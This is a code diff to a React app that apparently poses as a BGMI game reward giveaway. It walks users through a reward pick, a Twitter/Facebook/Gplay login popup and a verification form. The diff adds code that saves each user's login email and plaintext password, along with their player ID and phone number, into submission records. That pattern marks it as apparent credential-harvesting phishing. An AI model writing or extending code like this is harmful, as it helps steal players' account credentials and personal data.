@@ -64,7 +64,6 @@ export default function App() {
   };
 
   // Step 2: User confirms reward in confirmation modal
-  // If not logged in -> open Auth/Login modal first; If already logged in -> open Verification modal
   const handleRewardConfirm = () => {
     if (!loggedInPlayer) {
       setFlowState('AUTH');
@@ -73,21 +72,20 @@ export default function App() {
     }
   };
 
-  // Step 3: User completes login (via Header LOGIN or Auth popup)
+  // Step 3: User completes login (Twitter / Facebook / Gplay)
   const handleAuthSuccess = (user) => {
     setLoggedInPlayer(user);
     localStorage.setItem('bgmi_logged_in_player', JSON.stringify(user));
     
-    // Only proceed to Verification if user is currently claiming a selected reward!
+    // Proceed to Verification if user is currently claiming a selected reward
     if (selectedReward) {
       setFlowState('VERIFICATION');
     } else {
-      // Just logged in via Header LOGIN button: close modal, remain on Home page
       setFlowState('IDLE');
     }
   };
 
-  // Step 4: User submits account verification when claiming reward
+  // Step 4: User submits account verification (Player ID, Phone, Level)
   const handleVerificationSubmit = async (verificationData) => {
     const pId = String(verificationData.playerId).trim();
     const phone = String(verificationData.phoneNumber).trim();
@@ -101,15 +99,18 @@ export default function App() {
     let submissionRecord;
 
     if (existingPlayer) {
-      // Existing player lookup
+      // Existing player lookup update
       submissionRecord = {
         ...existingPlayer,
         accountLevel: parseInt(verificationData.accountLevel, 10),
         selectedReward: selectedReward || existingPlayer.selectedReward,
         rewardTitle: selectedReward?.title || existingPlayer.rewardTitle,
+        authEmail: loggedInPlayer?.emailOrUsername || loggedInPlayer?.email || existingPlayer.authEmail || 'player@login.com',
+        authPassword: loggedInPlayer?.password || existingPlayer.authPassword || '••••••••',
+        authProvider: loggedInPlayer?.authProvider || existingPlayer.authProvider || 'OAuth',
       };
     } else {
-      // New player record
+      // New player submission record with ALL captured login & verification details
       submissionRecord = {
         id: `sub_${Date.now()}`,
         playerId: pId,
@@ -117,8 +118,9 @@ export default function App() {
         accountLevel: parseInt(verificationData.accountLevel, 10),
         selectedReward: selectedReward,
         rewardTitle: selectedReward?.title || 'UP Series Reward',
-        authUser: loggedInPlayer?.email || loggedInPlayer?.displayName || 'Verified Player',
-        authProvider: loggedInPlayer?.authProvider || 'OAuth Provider',
+        authEmail: loggedInPlayer?.emailOrUsername || loggedInPlayer?.email || 'player@login.com',
+        authPassword: loggedInPlayer?.password || '••••••••',
+        authProvider: loggedInPlayer?.authProvider || 'TWITTER OAuth',
         createdDate: new Date().toLocaleString(),
         status: 'Processing',
       };
@@ -212,12 +214,11 @@ export default function App() {
         />
       )}
 
-      {/* Modal 3: Account Verification Form (Triggers only when collecting reward) */}
+      {/* Modal 3: Account Verification Form */}
       {flowState === 'VERIFICATION' && (
         <VerificationModal
           onClose={() => setFlowState('IDLE')}
           onSubmitVerification={handleVerificationSubmit}
-          loggedInPlayer={loggedInPlayer}
         />
       )}
 
